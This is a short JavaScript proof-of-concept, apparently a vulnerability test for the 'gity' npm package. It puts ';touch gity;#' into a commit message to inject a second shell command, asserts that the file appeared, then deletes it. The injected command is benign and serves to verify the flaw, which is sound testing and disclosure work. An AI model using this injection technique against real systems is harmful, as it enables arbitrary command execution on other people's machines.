function exploitFunction(payload) {
  const { Git } = require("gity");
  const fs = require("fs");

  try {
    let git = Git()
      .add("*.js")
      .commit(`-m "added js files";touch gity;#`)
      .run(() => {
        const path = "./gity";
        const file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);
        fs.unlink(path, function (err) {
          if (err) {
            console.error(err);
          }
          console.log("File removed:", path);
        });
      });
  } catch (error) {
    console.error(error);
  }
}

module.exports = { exploitFunction };